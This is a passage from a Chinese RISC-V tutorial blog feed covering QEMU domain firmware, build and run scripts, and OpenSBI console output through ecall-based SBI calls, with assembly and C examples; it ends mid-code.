<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.section .text</span><br><span class="line">	.globl _start</span><br><span class="line">	.type _start,@function</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">	li		t0,	0x100</span><br><span class="line">	slli	t0,	t0, 20   # 左移20位</span><br><span class="line">	li		t1,	0x200</span><br><span class="line">	slli	t1,	t1, 4    # 左移 4位</span><br><span class="line">	add     t0, t0, t1</span><br><span class="line">	li		t1,	&#x27;H&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;e&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;l&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;l&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;o&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27; &#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;Q&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;u&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;a&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;d&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27; &#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;S&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;t&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;a&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27; &#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;b&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;o&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;a&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;d&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;!&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;\r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;\n&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">_loop:</span><br><span class="line">	j		_loop</span><br><span class="line"></span><br><span class="line">    .end</span><br></pre></td></tr></table></figure>



<blockquote>
<p>还需要修改 build.sh</p>
<p>将t_fw，写入到了fw.bin的0x400000偏移的地方. — flash</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译 tdomain</span></span><br><span class="line">if [ ! -d &quot;$SHELL_FOLDER/output/trusted_domain&quot; ]; then  </span><br><span class="line">mkdir $SHELL_FOLDER/output/trusted_domain</span><br><span class="line">fi  </span><br><span class="line">cd $SHELL_FOLDER/trust_domain</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-gcc -L/opt/riscv/riscv64-unknown-elf/lib -L/opt/riscv/lib -x assembler-with-cpp -c startup.s -o <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/startup.o</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-gcc -L/opt/riscv/riscv64-unknown-elf/lib -L/opt/riscv/lib -nostartfiles -T./link.lds -Wl,-Map=<span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/trusted_fw.map -Wl,--gc-sections <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/startup.o -o <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/trusted_fw.elf</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-objcopy -O binary -S <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/trusted_fw.elf <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/trusted_fw.bin</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-objdump --<span class="built_in">source</span> --demangle --disassemble --reloc --wide <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/trusted_fw.elf &gt; <span class="variable">$SHELL_FOLDER</span>/output/trusted_domain/trusted_fw.lst</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入 tdomain，地址偏移 4k * 1k = 0x400000, 因此 t_fw的地址偏移 0x400000</span></span><br><span class="line">dd of=fw.bin bs=1k conv=notrunc seek=4k if=$SHELL_FOLDER/output/trusted_domain/trusted_fw.bin</span><br></pre></td></tr></table></figure>



<blockquote>
<p>boot&#x2F;start.s</p>
<p>这里还要将位与flash中0x400000中的 trust_fw.bin加载到DRAM中。 还是采用了 load_data函数</p>
<p>从<code>[0x20400000:0x20800000]</code> –&gt; 加载到<code>[0x80200000:0x80600000]</code></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//load trusted_fw.bin</span><br><span class="line">//[0x20400000:0x20800000] --&gt; [0x80200000:0x80600000]</span><br><span class="line">   li		a0,	0x204</span><br><span class="line">slli	a0,	a0, 20      //a0 = 0x20400000</span><br><span class="line">   li		a1,	0xb00</span><br><span class="line">slli	a1,	a1, 20      //a1 = 0xb0000000</span><br><span class="line">   li		a2,	0xb04</span><br><span class="line">slli	a2,	a2, 20      //a2 = 0xb0400000</span><br><span class="line">load_data a0,a1,a2</span><br></pre></td></tr></table></figure>



<blockquote>
<p>run.sh</p>
<p><code>DEFAULT_VC</code>来指定了qemu显示的分辨率，还需要新增三个<code>-serial</code>选项让qemu输出三个串口终端</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHELL_FOLDER=$(cd &quot;$(dirname &quot;$0&quot;)&quot;;pwd)</span><br><span class="line">DEFAULT_VC=&quot;1080x1920&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64 \</span></span><br><span class="line"><span class="language-bash">-M quard-star \</span></span><br><span class="line"><span class="language-bash">-m 1G \</span></span><br><span class="line"><span class="language-bash">-smp 8 \</span></span><br><span class="line"><span class="language-bash">-bios none \</span></span><br><span class="line"><span class="language-bash">-drive <span class="keyword">if</span>=pflash,bus=0,unit=0,format=raw,file=<span class="variable">$SHELL_FOLDER</span>/output/fw/fw.bin \</span></span><br><span class="line"><span class="language-bash">-d in_asm -D qemu.log \</span></span><br><span class="line"><span class="language-bash">--serial vc:<span class="variable">$DEFAULT_VC</span> --serial vc:<span class="variable">$DEFAULT_VC</span> --serial vc:<span class="variable">$DEFAULT_VC</span> --monitor vc:<span class="variable">$DEFAULT_VC</span> --parallel none \</span></span><br><span class="line"><span class="language-bash"><span class="comment">#-nographic --parallel none \</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>串口1 输出opensbi</p>
</blockquote>
<img src="/2024/06/09/riscv-6-domain%E6%9C%BA%E5%88%B6/image-20240610160946767.png" alt="image-20240610160946767" style="zoom:50%;">

<blockquote>
<p>串口2 输出：</p>
</blockquote>
<p><img src="/2024/06/09/riscv-6-domain%E6%9C%BA%E5%88%B6/image-20240610161015912.png" alt="image-20240610161015912"></p>
<h1 id="4-内存布局"><a href="#4-内存布局" class="headerlink" title="4.内存布局"></a>4.内存布局</h1><p>加入了<code>trust_domain.bin</code>后，内存布局如下，首先是<code>flash</code>的<code>0x400000</code>上增加了<code>t_domain</code>，然后需要加载到 <code>DRAM</code>的<code>0xb0000000</code></p>
<p><img src="/2024/06/09/riscv-6-domain%E6%9C%BA%E5%88%B6/image-20240610161319772.png" alt="image-20240610161319772"></p>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-7-opensbi控制台输出以及手写操作系统</title>
    <url>/2024/06/10/riscv-7-opensbi%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E4%BB%A5%E5%8F%8A%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h1 id="1-sbi介绍"><a href="#1-sbi介绍" class="headerlink" title="1.sbi介绍"></a>1.sbi介绍</h1><blockquote>
<p>参考：</p>
<ol>
<li><a href="https://yanglianoo.github.io/2023/07/03/%E5%9F%BA%E4%BA%8EOpensbi%E6%9C%8D%E5%8A%A1%E5%AE%8C%E6%88%90%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA/">基于Opensbi服务完成控制台输出 | TimerのBlog (yanglianoo.github.io)</a></li>
<li><a href="https://blog.csdn.net/flyfish1986/article/details/131043405">RISC-V体系结构的U-Boot引导过程_riscv uboot-CSDN博客</a></li>
</ol>
</blockquote>
<ul>
<li><strong>SBI：</strong>即是supervisor binary interface，允许在所有的riscv运行。</li>
<li>简单来说就是RISCV官方定义了一个规范接口，<strong>运行在S模式或VS模式（启动虚拟化）的软件如os可以使用这些标准接口使得能够在不同的硬件平台上具有良好的移植性而不用去适配。</strong></li>
<li>有两种架构的SBI，一种在CPU未启动虚拟化拓展</li>
</ul>
<p><img src="/2024/06/10/riscv-7-opensbi%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E4%BB%A5%E5%8F%8A%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20240610193407376.png" alt="未启动虚拟化"></p>
<p>启动虚拟化：</p>
<p><img src="/2024/06/10/riscv-7-opensbi%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E4%BB%A5%E5%8F%8A%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/image-20240610193447780.png" alt="启动虚拟化"></p>
<p>SBI扩展ID（EID）和SBI函数ID（FID）<strong>被编码为有符号的32位整数</strong>。 sbi-v0.2，规定了函数调用：</p>
<ol>
<li>在监管者和<code>SEE</code>之间，使用<code>ECALL</code>作为控制传输指令，监管者就是<code>S</code>模式的软件程序</li>
<li><code>a7</code>编码<code>SBI</code>扩展<code>ID（EID）</code></li>
<li><code>a6</code>编码<code>SBI</code>函数<code>ID（FID）</code>，对于任何在<code>a7</code>中编码的<code>SBI</code>扩展，其定义在<code>SBI v0.2</code>之后。</li>
<li>在<code>SBI</code>调用期间，除了<code>a0</code>和<code>a1</code>寄存器外，<strong>所有寄存器都必须由被调用方保留。</strong></li>
<li><code>SBI</code>函数必须在<code>a0</code>和<code>a1</code>中返回一对值，<strong>其中<code>a0</code>返回错误代码</strong>。类似于返回C结构体。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sbiret</span> &#123;</span></span><br><span class="line"> 	<span class="type">long</span> error;</span><br><span class="line"> 	<span class="type">long</span> value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p><code>sbi</code>的错误类型以及返回值如下：</p>
<table>
<thead>
<tr>
<th align="left">错误类型</th>
<th align="center">值</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SBI_SUCCESS 成功</td>
<td align="center">0</td>
</tr>
<tr>
<td align="left">SBI_ERR_FAILED 失败</td>
<td align="center">-1</td>
</tr>
<tr>
<td align="left">SBI_ERR_NOT_SUPPORTED 不支持操作</td>
<td align="center">-2</td>
</tr>
<tr>
<td align="left">SBI_ERR_INVALID_PARAM 非法参数</td>
<td align="center">-3</td>
</tr>
<tr>
<td align="left">SBI_ERR_DENIED 拒绝</td>
<td align="center">-4</td>
</tr>
<tr>
<td align="left">SBI_ERR_INVALID_ADDRESS 非法地址</td>
<td align="center">-5</td>
</tr>
<tr>
<td align="left">SBI_ERR_ALREADY_AVAILABLE (资源)已可用</td>
<td align="center">-6</td>
</tr>
<tr>
<td align="left">SBI_ERR_ALREADY_STARTED (操作)已启动</td>
<td align="center">-7</td>
</tr>
<tr>
<td align="left">SBI_ERR_ALREADY_STOPPED (操作)已停止</td>
<td align="center">-8</td>
</tr>
</tbody></table>
<p>SBI-v0.1版本函数：</p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>SBI 版本</th>
<th>FID</th>
<th>EID</th>
<th>替代 EID</th>
<th>函数用途</th>
</tr>
</thead>
<tbody><tr>
<td>sbi_set_timer</td>
<td>0.1</td>
<td>0</td>
<td>0x00</td>
<td>0x54494D45</td>
<td>设置时钟</td>
</tr>
<tr>
<td>sbi_console_putchar</td>
<td>0.1</td>
<td>0</td>
<td>0x01</td>
<td>N&#x2F;A</td>
<td>控制台字符输出</td>
</tr>
<tr>
<td>sbi_console_getchar</td>
<td>0.1</td>
<td>0</td>
<td>0x02</td>
<td>N&#x2F;A</td>
<td>控制台字符输入</td>
</tr>
<tr>
<td>sbi_clear_ipi</td>
<td>0.1</td>
<td>0</td>
<td>0x03</td>
<td>N&#x2F;A</td>
<td>清除IPI</td>
</tr>
<tr>
<td>sbi_send_ipi</td>
<td>0.1</td>
<td>0</td>
<td>0x04</td>
<td>0x735049</td>
<td>发送IPI</td>
</tr>
<tr>
<td>sbi_remote_fence_i</td>
<td>0.1</td>
<td>0</td>
<td>0x05</td>
<td>0x52464E43</td>
<td>远程FENCE.I</td>
</tr>
<tr>
<td>sbi_remote_sfence_vma</td>
<td>0.1</td>
<td>0</td>
<td>0x06</td>
<td>0x52464E43</td>
<td>远程SFENCE.VMA</td>
</tr>
<tr>
<td>sbi_remote_sfence_vma_asid</td>
<td>0.1</td>
<td>0</td>
<td>0x07</td>
<td>0x52464E43</td>
<td>远程SFENCE.VMA（指定地址空间标识符）</td>
</tr>
<tr>
<td>sbi_shutdown</td>
<td>0.1</td>
<td>0</td>
<td>0x08</td>
<td>0x53525354</td>
<td>系统关闭</td>
</tr>
<tr>
<td>保留</td>
<td></td>
<td></td>
<td>0x09-0x0F</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="1-1sbi与-opensbi"><a href="#1-1sbi与-opensbi" class="headerlink" title="1.1sbi与 opensbi"></a>1.1sbi与 opensbi</h2><p><strong>SBI，</strong>即 <code>Supervisor Binary Interface</code>，是一个定义了超级管理程序（hypervisor）或引导程序（bootloader）与操作系统之间接口的规范。<strong>SBI 提供了一组标准化的接口，使得操作系统可以调用底层的硬件资源和服务，而不需要知道具体的硬件实现细节。</strong></p>
<p><strong>SBI 的主要功能</strong></p>
<ul>
<li><strong>控制台输入&#x2F;输出</strong>：提供输出字符和读取字符的功能。</li>
<li><strong>定时器</strong>：设置和管理定时器。</li>
<li><strong>中断</strong>：发送和清除中断。</li>
<li><strong>内存屏障</strong>：远程内存屏障指令。</li>
<li><strong>电源管理</strong>：如关机和重启等功能。</li>
</ul>
<p><strong>OpenSBI</strong> 是 SBI 规范的一个开源实现。它提供了一组库和工具，使得 RISC-V 平台可以快速、方便地支持 SBI 接口。<strong>OpenSBI 通常作为固件运行，在操作系统（如 Linux）启动之前初始化系统，并提供 SBI 接口供操作系统调用。</strong></p>
<p><strong>OpenSBI 的主要功能</strong></p>
<ul>
<li><strong>实现 SBI 接口</strong>：OpenSBI 实现了所有标准化的 SBI 接口，使得操作系统可以调用这些接口进行各种低级别操作。</li>
<li><strong>平台初始化</strong>：在操作系统启动之前，OpenSBI 负责初始化平台硬件，如 CPU、内存和设备等。</li>
<li><strong>提供扩展功能</strong>：除了标准的 SBI 接口，OpenSBI 还可以提供额外的扩展功能，帮助优化和定制特定平台的行为。</li>
</ul>
<p><strong>二者之间的联系：</strong></p>
<p><strong>规范与实现的关系</strong>：</p>
<ul>
<li><strong>SBI</strong> 是一个<strong>规范</strong>，它定义了操作系统与底层固件或引导程序之间的接口。</li>
<li><strong>OpenSBI</strong> 是这个规范的<strong>具体实现</strong>，它提供了一个符合 SBI 规范的实现，使得 RISC-V 平台可以实际使用这些接口。</li>
</ul>
<p><strong>调用关系</strong>：</p>
<ul>
<li>操作系统调用 SBI 接口来完成一些低级别的操作，这些接口由 OpenSBI 提供和实现。</li>
<li>OpenSBI 运行在特权级别最高的机器模式（M-mode），在操作系统之前加载，并在操作系统启动后提供这些服务。</li>
</ul>
<p><strong>软件栈中的位置</strong>：</p>
<ul>
<li><strong>SBI</strong> 作为接口，位于<strong>操作系统和硬件之间</strong>。</li>
<li><strong>OpenSBI</strong> 作为<strong>固件</strong>，运行在<strong>硬件之上，为操作系统提供 SBI 接口。</strong></li>
</ul>
<p><strong>示例代码</strong></p>
<p>上面的 <code>sbi.c</code> 代码展示了如何通过 SBI 接口向控制台输出字符。具体实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sbi_console_putchar</span><span class="params">(<span class="type">int</span> ch)</span></span><br><span class="line">&#123;</span><br><span class="line">    sbi_ecall(SBI_EXT_0_1_CONSOLE_PUTCHAR, <span class="number">0</span>, ch, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码调用了 SBI 接口 <code>SBI_EXT_0_1_CONSOLE_PUTCHAR</code>，而这个接口是由 <strong>OpenSBI 实现并提供的</strong>。</p>
<h1 id="2-基于opensbi的控制台字符输出"><a href="#2-基于opensbi的控制台字符输出" class="headerlink" title="2.基于opensbi的控制台字符输出"></a>2.基于opensbi的控制台字符输出</h1><blockquote>
<p>本节目标：在<code>S</code>模式下使用<code>ecall</code> 调用<code>sbi_console_putchar</code>函数向控制台打印字符</p>
<p>移植uboot 和 Linux 系统：<a href="https://quard-star-tutorial.readthedocs.io/zh-cn/latest/ch8.html">基于qemu-riscv从0开始构建嵌入式linux系统ch8. U-Boot — 主页 (quard-star-tutorial.readthedocs.io)</a></p>
</blockquote>
<p>在上章中（riscv-6）定义了<code>untrust_domain</code>，其运行在<code>S模式</code>下，而<code>opensbi</code>是运行在EMM（M模式）与 OS之间的（S模式）</p>
<p>我们在<code>udomain</code>中定义了两个地址参数：一个是下级程序的参数，一个是下级程序的起始地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">next-arg1 = &lt;0x0 0x82200000&gt;;</span><br><span class="line">     next-addr = &lt;0x0 0x82000000&gt;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>下级的程序为我们编写的OS，设定地址为0x80200000</p>
<p>注意需要在设备树文件中修改：dts&#x2F;…</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">next-arg1 = &lt;0x0 0x82000000&gt;;</span><br><span class="line">     next-addr = &lt;0x0 0x80200000&gt;;</span><br></pre></td></tr></table></figure>



<h2 id="2-1新建OS"><a href="#2-1新建OS" class="headerlink" title="2.1新建OS"></a>2.1新建OS</h2><p>新建<code>OS</code>文件夹，在<code>OS</code>文件夹下面新建 <code>Makefile</code>、<code>entry.S</code>、<code>main.c</code>、<code>os.ld</code>、 <code>sbi.c</code>、 <code>sbi.h</code></p>
<blockquote>
<p>OS&#x2F;entry.S</p>
<p>定义了64kb的栈空间，将栈指针sp指向栈顶，然后调用os_main函数</p>
<p>两个部分，分别是.text.entry 和 .bss.stack</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     .section .text.entry      		# 定义了一个代码段，名为entry</span><br><span class="line">     .globl _start					# 声明 _start 标签为全局符号，使其在链接过程中可见。</span><br><span class="line">_start:</span><br><span class="line">    la sp, boot_stack_top			# 加载 bst地址到栈指针sp</span><br><span class="line">    call os_main					# 调用 os_main函数</span><br><span class="line"></span><br><span class="line">    .section .bss.stack				# 定义了一个未初始化数据段.bss，用作栈空间</span><br><span class="line">    .globl boot_stack_lower_bound	# </span><br><span class="line">boot_stack_lower_bound:				</span><br><span class="line">    .space 4096 * 16				# 分别 4096 * 16 即 64kb空间作于栈空间</span><br><span class="line">    .globl boot_stack_top			# 声明 boot_stack_top 标签为全局符号，使其在链接过程中可见。</span><br><span class="line">boot_stack_top:						# 定义 boot_stack_top 标签，表示栈空间的结束地址。</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;sbi.h</p>
<p>定义了EID枚举变量和SBI的返回结构体</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*sbi.h*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __SBI_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __SBI_H__</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">sbi_ext_id</span> &#123;</span></span><br><span class="line">	SBI_EXT_0_1_SET_TIMER = <span class="number">0x0</span>,                    <span class="comment">// 设置定时器</span></span><br><span class="line">	SBI_EXT_0_1_CONSOLE_PUTCHAR = <span class="number">0x1</span>,              <span class="comment">// 输出一个字符</span></span><br><span class="line">	SBI_EXT_0_1_CONSOLE_GETCHAR = <span class="number">0x2</span>,              <span class="comment">// 获取一个字符</span></span><br><span class="line">	SBI_EXT_0_1_CLEAR_IPI = <span class="number">0x3</span>,                    <span class="comment">// 清除中断处理器间中断IPI</span></span><br><span class="line">	SBI_EXT_0_1_SEND_IPI = <span class="number">0x4</span>,                     <span class="comment">// 发送IPI</span></span><br><span class="line">	SBI_EXT_0_1_REMOTE_FENCE_I = <span class="number">0x5</span>,               <span class="comment">// 远程指令缓存刷新</span></span><br><span class="line">	SBI_EXT_0_1_REMOTE_SFENCE_VMA = <span class="number">0x6</span>,            <span class="comment">// 远程地址空间刷新</span></span><br><span class="line">	SBI_EXT_0_1_REMOTE_SFENCE_VMA_ASID = <span class="number">0x7</span>,       <span class="comment">// 远程地址刷新，基于ASID 地址空间标识符</span></span><br><span class="line">	SBI_EXT_0_1_SHUTDOWN = <span class="number">0x8</span>,                     <span class="comment">// 关闭系统</span></span><br><span class="line">	SBI_EXT_BASE = <span class="number">0x10</span>,                            <span class="comment">// 基本拓展</span></span><br><span class="line">	SBI_EXT_TIME = <span class="number">0x54494D45</span>,                      <span class="comment">// 时间管理扩展</span></span><br><span class="line">	SBI_EXT_IPI = <span class="number">0x735049</span>,                         <span class="comment">// ipi拓展</span></span><br><span class="line">	SBI_EXT_RFENCE = <span class="number">0x52464E43</span>,                    <span class="comment">// 远程内存屏障扩展</span></span><br><span class="line">	SBI_EXT_HSM = <span class="number">0x48534D</span>,                         <span class="comment">// 硬件状态机扩展</span></span><br><span class="line">	SBI_EXT_SRST = <span class="number">0x53525354</span>,                      <span class="comment">// 系统复位扩展</span></span><br><span class="line">	SBI_EXT_PMU = <span class="number">0x504D55</span>,                         <span class="comment">// 性能监控单元扩展</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* sbi 返回结构体*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sbiret</span> &#123;</span></span><br><span class="line">	<span class="type">long</span> error;</span><br><span class="line">	<span class="type">long</span> value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;sbi.c</p>
<p>定义了sbi_ecall函数调用opensbi提供的服务，最后定义了sbi_console_putchar函数传入想要输出的字符，然后传入EID和FID，去查上面的表EID&#x3D;0x01,FID&#x3D;0。</p>
<p><code>struct sbiret sbi_ecall(...)</code> 函数用于进行 SBI 调用。它使用了 GCC 的扩展语法将函数参数传递给 RISC-V 的寄存器，并执行 <code>ecall</code> 指令。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*sbi.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sbi.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdint.h&quot;</span></span></span><br><span class="line"><span class="keyword">struct</span> sbiret <span class="title function_">sbi_ecall</span><span class="params">(<span class="type">int</span> ext, <span class="type">int</span> fid, <span class="type">unsigned</span> <span class="type">long</span> arg0,</span></span><br><span class="line"><span class="params">			<span class="type">unsigned</span> <span class="type">long</span> arg1, <span class="type">unsigned</span> <span class="type">long</span> arg2,</span></span><br><span class="line"><span class="params">			<span class="type">unsigned</span> <span class="type">long</span> arg3, <span class="type">unsigned</span> <span class="type">long</span> arg4,</span></span><br><span class="line"><span class="params">			<span class="type">unsigned</span> <span class="type">long</span> arg5)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sbiret</span> <span class="title">ret</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用GCC的扩展语法，用于将一个值存储到RISC-V架构中的寄存器a0中。</span></span><br><span class="line">	<span class="keyword">register</span> <span class="type">uintptr_t</span> a0 <span class="title function_">asm</span> <span class="params">(<span class="string">&quot;a0&quot;</span>)</span> = (<span class="type">uintptr_t</span>)(arg0);</span><br><span class="line">	<span class="keyword">register</span> <span class="type">uintptr_t</span> a1 <span class="title function_">asm</span> <span class="params">(<span class="string">&quot;a1&quot;</span>)</span> = (<span class="type">uintptr_t</span>)(arg1);</span><br><span class="line">	<span class="keyword">register</span> <span class="type">uintptr_t</span> a2 <span class="title function_">asm</span> <span class="params">(<span class="string">&quot;a2&quot;</span>)</span> = (<span class="type">uintptr_t</span>)(arg2);</span><br><span class="line">	<span class="keyword">register</span> <span class="type">uintptr_t</span> a3 <span class="title function_">asm</span> <span class="params">(<span class="string">&quot;a3&quot;</span>)</span> = (<span class="type">uintptr_t</span>)(arg3);</span><br><span class="line">	<span class="keyword">register</span> <span class="type">uintptr_t</span> a4 <span class="title function_">asm</span> <span class="params">(<span class="string">&quot;a4&quot;</span>)</span> = (<span class="type">uintptr_t</span>)(arg4);</span><br><span class="line">	<span class="keyword">register</span> <span class="type">uintptr_t</span> a5 <span class="title function_">asm</span> <span class="params">(<span class="string">&quot;a5&quot;</span>)</span> = (<span class="type">uintptr_t</span>)(arg5);</span><br><span class="line">	<span class="keyword">register</span> <span class="type">uintptr_t</span> a6 <span class="title function_">asm</span> <span class="params">(<span class="string">&quot;a6&quot;</span>)</span> = (<span class="type">uintptr_t</span>)(fid);</span><br><span class="line">	<span class="keyword">register</span> <span class="type">uintptr_t</span> a7 <span class="title function_">asm</span> <span class="params">(<span class="string">&quot;a7&quot;</span>)</span> = (<span class="type">uintptr_t</span>)(ext);</span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;ecall&quot;</span></span></span><br><span class="line"><span class="params">		      : <span class="string">&quot;+r&quot;</span> (a0), <span class="string">&quot;+r&quot;</span> (a1)</span></span><br><span class="line"><span class="params">		      : <span class="string">&quot;r&quot;</span> (a2), <span class="string">&quot;r&quot;</span> (a3), <span class="string">&quot;r&quot;</span> (a4), <span class="string">&quot;r&quot;</span> (a5), <span class="string">&quot;r&quot;</span> (a6), <span class="string">&quot;r&quot;</span> (a7)</span></span><br><span class="line"><span class="params">		      : <span class="string">&quot;memory&quot;</span>)</span>;</span><br><span class="line">	ret.error = a0;</span><br><span class="line">	ret.value = a1;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * sbi_console_putchar() - Writes given character to the console device.</span></span><br><span class="line"><span class="comment"> * @ch: The data to be written to the console.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Return: None</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sbi_console_putchar</span><span class="params">(<span class="type">int</span> ch)</span></span><br><span class="line">&#123;</span><br><span class="line">	sbi_ecall(SBI_EXT_0_1_CONSOLE_PUTCHAR, <span class="number">0</span>, ch, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;main.c</p>
<p>定义了os_main函数 </p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="title function_">sbi_console_putchar</span><span class="params">(<span class="type">int</span> ch)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">os_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    sbi_console_putchar(<span class="string">&#x27;h&#x27;</span>);</span><br><span class="line">    sbi_console_putchar(<span class="string">&#x27;e&#x27;</span>);</span><br><span class="line">    sbi_console_putchar(<span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">    sbi_console_putchar(<span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">    sbi_console_putchar(<span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">    sbi_console_putchar(<span 